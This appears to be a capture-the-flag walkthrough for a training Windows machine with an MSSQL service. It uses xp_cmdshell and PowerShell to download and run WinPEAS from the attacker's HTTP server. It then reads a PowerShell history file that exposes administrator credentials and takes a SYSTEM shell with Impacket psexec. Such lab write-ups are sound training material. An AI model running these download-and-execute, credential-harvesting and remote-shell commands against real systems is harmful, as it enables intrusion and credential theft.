# Downloading WinPEAS

*To enumerate possible privilege escalation paths, I decided to use WinPEAS.*

Download WinPEAS on Kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

Rename the file:

```bash
mv winPEASx64.exe wp.exe
```

*Shorter filenames make command execution easier later.*

Verify:

```bash
ls
```

## Results

```text
wp.exe
```

---

# Hosting the File

Check VPN IP:

```bash
ip a | grep tun0
```

Start a simple HTTP server:

```bash
python3 -m http.server 1337
```

## Results

```text
Serving HTTP on 0.0.0.0 port 1337
```

---

# Transferring WinPEAS

*The plan is to transfer WinPEAS from Kali to the target machine using PowerShell and `xp_cmdshell`.*

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://10.10.15.56:1337/wp.exe -OutFile C:\Windows\Temp\wp.exe"';
```

Verify the transfer:

```sql
EXEC xp_cmdshell 'dir C:\Windows\Temp';
```

---

# Executing WinPEAS

Run WinPEAS:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe';
```

Or save the output to a file:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe > C:\Windows\Temp\results.txt';
```

Read the output:

```sql
EXEC xp_cmdshell 'type C:\Windows\Temp\results.txt';
```

*The output was very large, so instead of manually reviewing every line, I continued searching manually for interesting files and credentials.*

---

# User Flag

Navigate to the Desktop of the current user:

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
```

Read the user flag:

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
```

---

# Discovering Administrator Credentials

*While searching for interesting files and command history, I discovered a PowerShell history file belonging to the `sql_svc` user.*

Read the PowerShell history:

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

## Results

```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

## Credentials Found

```text
administrator : MEGACORP_4dm1n!!
```

*The PowerShell history file exposed administrator credentials that had previously been used to access the backup share.*

## Interesting Observation

*This demonstrates how PowerShell history files can become valuable post-exploitation artifacts, as sensitive operational commands may remain stored in plaintext.*

---

# Privilege Escalation with PsExec

*Now that we have administrator credentials, we can use Impacket's `psexec.py` to gain administrative access on the target machine.*

```bash
psexec.py administrator:'MEGACORP_4dm1n!!'@10.129.48.83
```

## Successful Connection

```text
[*] Requesting shares on 10.129.48.83.....
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Opening SVCManager on 10.129.48.83.....
[*] Creating service...
[*] Starting service...
```

*PsExec works by uploading a service executable to the writable ADMIN$ share and remotely creating a Windows service to execute commands with administrative privileges.*

Verify privileges:

```cmd
whoami
```

## Results

```text
nt authority\system
```

*We now have SYSTEM-level access.*

